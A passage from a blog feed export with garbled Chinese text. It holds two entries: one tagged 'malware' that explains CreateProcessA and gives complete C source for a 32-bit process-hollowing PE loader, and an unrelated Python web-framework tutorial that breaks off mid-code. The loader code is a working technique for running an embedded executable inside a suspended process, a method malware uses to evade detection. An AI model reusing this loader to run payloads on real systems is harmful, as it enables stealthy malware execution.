href="https://learn.microsoft.com/zh-cn/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessasusera">CreateProcessAsUser</a> æˆ– <a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winbase/nf-winbase-createprocesswithlogonw">CreateProcessWithLogonW</a> å‡½æ•°ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CreateProcessA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in, optional]      LPCSTR                lpApplicationName,</span></span><br><span class="line"><span class="params">  [in, out, optional] LPSTR                 lpCommandLine,</span></span><br><span class="line"><span class="params">  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span><br><span class="line"><span class="params">  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="line"><span class="params">  [in]                BOOL                  bInheritHandles,</span></span><br><span class="line"><span class="params">  [in]                DWORD                 dwCreationFlags,</span></span><br><span class="line"><span class="params">  [in, optional]      LPVOID                lpEnvironment,</span></span><br><span class="line"><span class="params">  [in, optional]      LPCSTR                lpCurrentDirectory,</span></span><br><span class="line"><span class="params">  [in]                LPSTARTUPINFOA        lpStartupInfo,</span></span><br><span class="line"><span class="params">  [out]               LPPROCESS_INFORMATION lpProcessInformation</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><ul><li><p><code>lpApplicationName</code>ï¼šexeçš„æ–‡ä»¶è·¯å¾„ï¼Œæ¯”å¦‚<code>c:\test.exe</code></p></li><li><p><code>lpCommandLine</code>ï¼šè¦æ‰§è¡Œè¯¥ç¨‹åºæ—¶çš„å‚æ•°</p></li><li><p><code>bInheritHandles</code>ï¼šå¦‚æœæ­¤å‚æ•°ä¸º TRUEï¼Œåˆ™è°ƒç”¨è¿›ç¨‹ä¸­çš„æ¯ä¸ªå¯ç»§æ‰¿å¥æŸ„éƒ½ç”±æ–°è¿›ç¨‹ç»§æ‰¿ã€‚ å¦‚æœå‚æ•°ä¸º FALSEï¼Œåˆ™ä¸ç»§æ‰¿å¥æŸ„ã€‚</p></li><li><p><code>dwCreationFlags</code>ï¼šæ§åˆ¶ä¼˜å…ˆçº§ç±»å’Œè¿›ç¨‹çš„<strong>åˆ›å»ºçš„æ ‡å¿—</strong>ã€‚</p></li><li><p><code>lpProcessInformation</code>ï¼šè¿›ç¨‹ä¿¡æ¯</p><p>windowsä¸­ä½¿ç”¨<code>PROCESS_INFORMATION</code>æè¿°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> &#123;</span></span><br><span class="line">    HANDLE hProcess;<span class="comment">//æ–°åˆ›å»ºçš„è¿›ç¨‹çš„å¥æŸ„ã€‚ å¥æŸ„ç”¨äºåœ¨å¯¹è¿›ç¨‹å¯¹è±¡æ‰§è¡Œæ“ä½œçš„æ‰€æœ‰å‡½æ•°ä¸­æŒ‡å®šè¿›ç¨‹ã€‚</span></span><br><span class="line">    HANDLE hThread;<span class="comment">//æ–°åˆ›å»ºçš„è¿›ç¨‹çš„ä¸»çº¿ç¨‹çš„å¥æŸ„ã€‚ å¥æŸ„ç”¨äºåœ¨çº¿ç¨‹å¯¹è±¡ä¸Šæ‰§è¡Œæ“ä½œçš„æ‰€æœ‰å‡½æ•°ä¸­æŒ‡å®šçº¿ç¨‹ã€‚</span></span><br><span class="line">    DWORD dwProcessId;<span class="comment">//å¯ç”¨äºæ ‡è¯†è¿›ç¨‹çš„å€¼ã€‚ ä»åˆ›å»ºè¿›ç¨‹åˆ°è¿›ç¨‹çš„æ‰€æœ‰å¥æŸ„å…³é—­å¹¶é‡Šæ”¾è¿›ç¨‹å¯¹è±¡ä¸ºæ­¢ï¼Œè¯¥å€¼æœ‰æ•ˆ;æ­¤æ—¶ï¼Œå¯ä»¥é‡å¤ä½¿ç”¨æ ‡è¯†ç¬¦ã€‚</span></span><br><span class="line">    DWORD dwThreadId;<span class="comment">//å¯ç”¨äºæ ‡è¯†çº¿ç¨‹çš„å€¼ã€‚ åœ¨çº¿ç¨‹åˆ›å»ºåˆ°çº¿ç¨‹çš„æ‰€æœ‰å¥æŸ„å…³é—­ä¸”çº¿ç¨‹å¯¹è±¡é‡Šæ”¾ä¹‹å‰ï¼Œè¯¥å€¼æœ‰æ•ˆ;æ­¤æ—¶ï¼Œå¯ä»¥é‡å¤ä½¿ç”¨æ ‡è¯†ç¬¦ã€‚</span></span><br><span class="line">&#125; PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;</span><br></pre></td></tr></table></figure></li><li><p><code>lpStartupInfo</code>ï¼šå¯åŠ¨æ—¶çš„ä¿¡æ¯</p><p>åŒæ—¶å¦‚æœè¦å¼€å¯ä¸€ä¸ªè¿›ç¨‹çš„è¯éœ€è¦å‘å…¶æä¾›åŸºç¡€ç¯å¢ƒï¼Œwindowsä¸­ä¸º<code>STARTUPINFOA</code>ï¼ŒæŒ‡å®šåˆ›å»ºæ—¶è¿›ç¨‹çš„ä¸»çª—å£çš„çª—å£å·¥ä½œç«™ã€æ¡Œé¢ã€æ ‡å‡†å¥æŸ„å’Œå¤–è§‚ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOA</span> &#123;</span></span><br><span class="line">    DWORD   cb;<span class="comment">//ç»“æ„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚</span></span><br><span class="line">    LPSTR   lpReserved;<span class="comment">//ä¿ç•™;å¿…é¡»ä¸º NULL</span></span><br><span class="line">    ...</span><br><span class="line">    DWORD   dwFlags;<span class="comment">//ä¸€ä¸ªä½å­—æ®µï¼Œç”¨äºç¡®å®šè¿›ç¨‹åˆ›å»ºçª—å£æ—¶æ˜¯å¦ä½¿ç”¨æŸäº› STARTUPINFO æˆå‘˜ã€‚ æ­¤æˆå‘˜å¯ä»¥æ˜¯ä»¥ä¸‹ä¸€ä¸ªæˆ–å¤šä¸ªå€¼ã€‚</span></span><br><span class="line">    <span class="comment">//å‚è€ƒ https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa</span></span><br><span class="line">   ...</span><br><span class="line">    WORD    cbReserved2;<span class="comment">//ä¿ç•™ä¾› C è¿è¡Œæ—¶ä½¿ç”¨;å¿…é¡»ä¸ºé›¶ã€‚</span></span><br><span class="line">    LPBYTE  lpReserved2;<span class="comment">//ä¿ç•™ä¾› C è¿è¡Œæ—¶ä½¿ç”¨;å¿…é¡»ä¸º NULLã€‚</span></span><br><span class="line">    HANDLE  hStdInput;</span><br><span class="line">    HANDLE  hStdOutput;</span><br><span class="line">    HANDLE  hStdError;</span><br><span class="line">&#125; STARTUPINFOA, *LPSTARTUPINFOA;</span><br></pre></td></tr></table></figure></li></ul><p>æœ€ååˆ›å»ºå¥½çš„è¿›ç¨‹å°±åœ¨<code>lpProcessInformation</code>çš„<code>hProcess</code>ä¸­äº†</p><h1 id="ç¼–å†™loaderè¿›ç¨‹é•‚ç©º"><a class="markdownIt-Anchor" href="#ç¼–å†™loaderè¿›ç¨‹é•‚ç©º"></a> ç¼–å†™Loaderï¼ˆè¿›ç¨‹é•‚ç©ºï¼‰</h1><p>çŸ¥é“äº†åŠ è½½è¿‡ç¨‹ï¼Œé‚£ä¹ˆ</p><ol><li>è·å¾—DOSå¤´ï¼Œä»è€Œè·å¾—NTå¤´</li><li>æ£€æŸ¥æ˜¯å¦ä¸ºæ­£ç¡®çš„æ–‡ä»¶æ ¼å¼ï¼ˆPEï¼‰</li><li>åˆå§‹åŒ–è¿›ç¨‹ä¿¡æ¯å’Œå¯åŠ¨æ—¶ä¿¡æ¯</li><li>åˆ›å»ºå½“å‰ç¨‹åºè¿›ç¨‹çš„å‰¯æœ¬ï¼Œå¹¶å°†å‰¯æœ¬è®¾ç½®ä¸ºæš‚åœ</li><li>æ ¹æ®ä¸Šä¸‹æ–‡ä¿¡æ¯æ‰¾åˆ°å¯¼å…¥è¡¨å’ŒPEB</li><li>å¤åˆ¶å¯¼å…¥è¡¨å’ŒPEBï¼Œå°†EAXè®¾ç½®ä¸ºå¾…åŠ è½½PEæ–‡ä»¶çš„å…¥å£åœ°å€<code>DWORD(pImageBase) + NTHeader-&gt;OptionalHeader.AddressOfEntryPoint;</code></li><li>æ¢å¤æš‚åœçš„å‰¯æœ¬ï¼Œè¿è¡ŒåŠ è½½çš„PEæ–‡ä»¶</li></ol><p><img src="https://cdn-images.postach.io/1048057d-e83d-423e-a47b-f4c6f4737870/b9621a0e-f58d-43f9-8b52-331139f11008/8f876f09-767b-46d4-a370-627f87733e68.png" alt="img" /></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">RunPe</span><span class="params">(HANDLE Image)</span></span><br><span class="line">&#123;</span><br><span class="line">IMAGE_DOS_HEADER* DOSHeader;<span class="comment">//DOSæ–‡ä»¶å¤´</span></span><br><span class="line">IMAGE_NT_HEADERS* NTHeader;<span class="comment">//PEæ–‡ä»¶å¤´</span></span><br><span class="line">IMAGE_SECTION_HEADER* SectionHeader;<span class="comment">//èŠ‚å¤´</span></span><br><span class="line"></span><br><span class="line">PROCESS_INFORMATION PI;<span class="comment">//è¿›ç¨‹ä¿¡æ¯</span></span><br><span class="line">STARTUPINFOA SI;<span class="comment">//å¯åŠ¨ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">DWORD* ImageBase;<span class="comment">//VARåŸºåœ°å€</span></span><br><span class="line"><span class="type">void</span>* pImageBase;<span class="comment">//æŒ‡å‘å¤´çš„æŒ‡é’ˆ</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> count;</span><br><span class="line"><span class="type">char</span> FilePath[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">DOSHeader = PIMAGE_DOS_HEADER(Image);<span class="comment">//å¾—åˆ°DOSå¤´</span></span><br><span class="line">NTHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader-&gt;e_lfanew);<span class="comment">//å¾—åˆ°PEå¤´</span></span><br><span class="line"></span><br><span class="line">GetModuleFileNameA(<span class="number">0</span>, FilePath, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (NTHeader-&gt;Signature == IMAGE_NT_SIGNATURE) &#123;<span class="comment">//æ£€æŸ¥æ˜¯å¦ä¸ºPEæ–‡ä»¶</span></span><br><span class="line">ZeroMemory(&amp;PI, <span class="keyword">sizeof</span>(PI));</span><br><span class="line">ZeroMemory(&amp;SI, <span class="keyword">sizeof</span>(SI));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CreateProcessA(FilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE,</span><br><span class="line">CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;SI, &amp;PI)) &#123;<span class="comment">//åˆ›å»ºå½“å‰è¿›ç¨‹çš„æš‚åœå‰¯æœ¬</span></span><br><span class="line">CONTEXT *CTX = PCONTEXT(VirtualAlloc(<span class="literal">NULL</span>,<span class="keyword">sizeof</span>(CTX), MEM_COMMIT, PAGE_READWRITE));</span><br><span class="line">CTX-&gt;ContextFlags = CONTEXT_FULL;<span class="comment">//åˆ›å»ºä¸Šä¸‹æ–‡</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) &#123;<span class="comment">//å¦‚æœä¸Šä¸‹æ–‡åœ¨çº¿ç¨‹ä¸­</span></span><br><span class="line"><span class="comment">//è¯»å–æŒ‡ä»¤</span></span><br><span class="line">ReadProcessMemory(PI.hProcess, LPCVOID(CTX-&gt;Ebx + <span class="number">8</span>), LPVOID(&amp;ImageBase), <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NTHeader-&gt;OptionalHeader.ImageBase),</span><br><span class="line">NTHeader-&gt;OptionalHeader.SizeOfImage, <span class="number">0x3000</span>, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‘è¿›ç¨‹çš„æš‚åœå‰¯æœ¬å†™å…¥æŒ‡ä»¤</span></span><br><span class="line">WriteProcessMemory(PI.hProcess, pImageBase, Image, NTHeader-&gt;OptionalHeader.SizeOfHeaders, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (count = <span class="number">0</span>; count &lt; NTHeader-&gt;FileHeader.NumberOfSections; count++) &#123;</span><br><span class="line">SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader-&gt;e_lfanew+<span class="number">248</span>+(count*<span class="number">40</span>));</span><br><span class="line">WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader-&gt;VirtualAddress),</span><br><span class="line">LPVOID(DWORD(Image) + SectionHeader-&gt;PointerToRawData), SectionHeader-&gt;SizeOfRawData, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">WriteProcessMemory(PI.hProcess, LPVOID(CTX-&gt;Ebx + <span class="number">8</span>),</span><br><span class="line">LPVOID(&amp;NTHeader-&gt;OptionalHeader.ImageBase), <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å°†å…¥å£åœ°å€æ”¾å…¥EAXå¯„å­˜å™¨</span></span><br><span class="line">CTX-&gt;Eax = DWORD(pImageBase) + NTHeader-&gt;OptionalHeader.AddressOfEntryPoint;</span><br><span class="line">SetThreadContext(PI.hThread, LPCONTEXT(CTX));</span><br><span class="line">ResumeThread(PI.hThread);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> rawData[<span class="number">91209</span>] = &#123;...&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">RunPe(rawData);</span><br><span class="line"><span class="comment">//getchar();</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/d594572b354d7f3a546c13620b64d316.png" alt="result" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä½¿ç”¨windows APIç¼–å†™PEæ–‡ä»¶åŠ è½½å™¨ï¼ˆLoaderï¼‰&lt;br /&gt;
ç›®å‰æ”¯æ”¯æŒ32ä½&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="malware" scheme="https://joe1sn.eu.org/tags/malware/"/>
    
    <category term="C" scheme="https://joe1sn.eu.org/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>ã€Muudå¼€å‘ã€‘2.HTTPæœåŠ¡æ”¹å–„</title>
    <link href="https://joe1sn.eu.org/2023/06/01/web-0x2/"/>
    <id>https://joe1sn.eu.org/2023/06/01/web-0x2/</id>
    <published>2023-06-01T12:15:29.000Z</published>
    <updated>2023-06-06T07:15:20.342Z</updated>
    
    <content type="html"><![CDATA[<p>ä»0åˆ°1å¼€å‘ä¸€ä¸ªå‹‰å¼ºèƒ½ç”¨çš„python webâ€œæ¡†æ¶â€</p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/Joe1sn/muud">https://github.com/Joe1sn/muud</a></p><span id="more"></span><h1 id="ä¸»è¦æ”¹è¿›"><a class="markdownIt-Anchor" href="#ä¸»è¦æ”¹è¿›"></a> ä¸»è¦æ”¹è¿›</h1><h2 id="6-1-è¿”å›æŠ¥æ–‡è®¾ç½®"><a class="markdownIt-Anchor" href="#6-1-è¿”å›æŠ¥æ–‡è®¾ç½®"></a> 6-1 è¿”å›æŠ¥æ–‡è®¾ç½®</h2><p>é¦–å…ˆå°†åŸæ¥çš„æ‹¼æ¥å­—ç¬¦ä¸²æ”¹ä¸ºäº†Responseç±»ï¼Œå®ç°HTTPæŠ¥æ–‡å­—æ®µçš„è‡ªå®šä¹‰</p><p>è¿™æ ·å¯ä»¥å¤§å¤§ç®€åŒ–<code>view.py</code>ä¸­çš„ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Response</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, <span class="built_in">type</span>=<span class="string">&quot;json&quot;</span>, status_code=<span class="number">200</span>, </span></span><br><span class="line"><span class="params">                        reply=<span class="string">&quot;&quot;</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.content_type = content_types[<span class="built_in">type</span>]</span><br><span class="line">        self.status_code = status_code</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;json&quot;</span>: </span><br><span class="line">            self.reply = json.dumps(reply, ensure_ascii=<span class="literal">False</span>).encode(<span class="string">&#x27;unicode_escape&#x27;</span>).decode()</span><br><span class="line">        <span class="keyword">else</span>:   self.reply = reply</span><br><span class="line">        self.length = <span class="built_in">len</span>(self.reply)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">consum</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        result += <span class="string">&quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            status_code=self.status_code,   msg=status_code_dict[self.status_code])</span><br><span class="line">        result += <span class="string">&quot;Content-Type: &#123;type&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            <span class="built_in">type</span> = self.content_type)</span><br><span class="line">        result += <span class="string">&quot;Content-Length: &#123;length&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            length=self.length)</span><br><span class="line">        result += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">        result += self.reply</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥æ›´ç®€å•çš„ç¼–å†™è§†å›¾å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@http_api</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">html_test</span>(<span class="params">http_request</span>):</span><br><span class="line">    data = <span class="string">&quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hello, world!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span></span><br><span class="line">    result = Response(reply=data,<span class="built_in">type</span>=<span class="string">&quot;html&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result.consum().encode()</span><br></pre></td></tr></table></figure><p>ä¸è¿‡ä»»ç„¶æ¬ ç¼ºæ–‡ä»¶æœåŠ¡ï¼Œä¸è¿‡åœ¨<code>epoll</code>æœåŠ¡å™¨çš„sendéƒ¨åˆ†ä¿®æ”¹å°±è¡Œäº†ï¼Œæ›´å¤æ‚çš„è¿˜æ¶‰åŠåˆ°æ–‡ä»¶ä¸Šä¼ ç­‰ï¼Œåç»­å®ç°http.serverè¿™ç§æœåŠ¡æ•ˆæœï¼Œä¸ç„¶é™æ€ç½‘é¡µåŠ è½½å¾ˆéº»çƒ¦ã€‚</p><h2 id="6-2-è®¾ç½®æ›´å¤šçš„content_type"><a class="markdownIt-Anchor" href="#6-2-è®¾ç½®æ›´å¤šçš„content_type"></a> 6-2 è®¾ç½®æ›´å¤šçš„content_type</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">content_types = &#123;</span><br><span class="line">    <span class="string">&quot;text&quot;</span>: <span class="string">&quot;text/plain&quot;</span>,</span><br><span class="line">    <span class="string">&quot;html&quot;</span>: <span class="string">&quot;text/html&quot;</span>,    <span class="comment">#HTMLæ–‡æ¡£</span></span><br><span class="line">    <span class="string">&quot;css&quot;</span> : <span class="string">&quot;text/css&quot;</span>,     <span class="comment">#CSSæ ·å¼è¡¨</span></span><br><span class="line">    <span class="string">&quot;js&quot;</span> : <span class="string">&quot;text/javascript&quot;</span>,   <span class="comment">#JavaScriptè„šæœ¬</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;json&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pdf&quot;</span>: <span class="string">&quot;application/pdf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xml&quot;</span>: <span class="string">&quot;application/xml&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bin&quot;</span>: <span class="string">&quot;application/octet-stream&quot;</span>,  <span class="comment">#[ç‰¹è´¨]</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;jpeg&quot;</span>: <span class="string">&quot;image/jpeg&quot;</span>,   <span class="comment">#JPEGå›¾åƒ</span></span><br><span class="line">    <span class="string">&quot;png&quot;</span>: <span class="string">&quot;image/png&quot;</span>,     <span class="comment">#PNGå›¾åƒ</span></span><br><span class="line">    <span class="string">&quot;gif&quot;</span>: <span class="string">&quot;image/gif&quot;</span>,     <span class="comment">#GIFå›¾åƒ</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;mpeg&quot;</span>: <span class="string">&quot;audio/mpeg&quot;</span>,   <span class="comment">#MPEGéŸ³é¢‘</span></span><br><span class="line">    <span class="string">&quot;wav&quot;</span>: <span class="string">&quot;audio/wav&quot;</span>,     <span class="comment">#WAVéŸ³é¢‘</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;mp4&quot;</span> : <span class="string">&quot;video/mp4&quot;</span>,    <span class="comment">#MP4è§†é¢‘</span></span><br><span class="line">    <span class="string">&quot;mpeg&quot;</span> : <span class="string">&quot;video/mpeg&quot;</span>,  <span class="comment">#MPEGè§†é¢‘</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Responseçš„è¿”å›æ”¹ä¸ºbytesç±»å‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">consum</span>(<span class="params">self</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    result += <span class="string">&quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        status_code=self.status_code,   msg=status_code_dict[self.status_code])</span><br><span class="line">    result += <span class="string">&quot;Content-Type: &#123;type&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        <span class="built_in">type</span> = self.content_type)</span><br><span class="line">    result += <span class="string">&quot;Content-Length: &#123;length&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        length=self.length)</span><br><span class="line">    result += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">    result = result.encode()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(self.reply) == <span class="built_in">bytes</span>:</span><br><span class="line">        result += self.reply</span><br><span class="line">    <span class="keyword">else</span>:   result += self.reply.encode()</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±èƒ½ç›´æ¥è®¿é—®å„ç§æ–‡ä»¶äº†ï¼Œæ–¹ä¾¿ä¸‹ä¸€æ­¥æ¸²æŸ“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@http_api</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_test</span>(<span class="params">http_request</span>):</span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;/mnt/d/Github/muud/test/test.pdf&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        result = f.read()</span><br><span class="line">    result = Response(reply=result,<span class="built_in">type</span>=<span class="string">&quot;pdf&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result.consum()</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/82845027c13d1eb42726354e98f2a0bc.png" alt="image-20230603110534674" /></p><h2 id="6-3~4-æ–‡ä»¶ä¸Šä¼ "><a class="markdownIt-Anchor" href="#6-3~4-æ–‡ä»¶ä¸Šä¼ "></a> 6-3~4 æ–‡ä»¶ä¸Šä¼ </h2><p>è¿™éƒ¨åˆ†å†™çš„æŒºä¹…çš„ï¼Œå› ä¸ºæ¶‰åŠåˆ°epollæ¨¡å‹çš„æ”¹å–„ï¼Œåé¢å›ç»§ç»­æ”¹è¿›è¿™ä¸ªæ¨¡å—</p><p>é¦–å…ˆæœ‰è¿™ä¸¤ä¸ªè§†å›¾å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 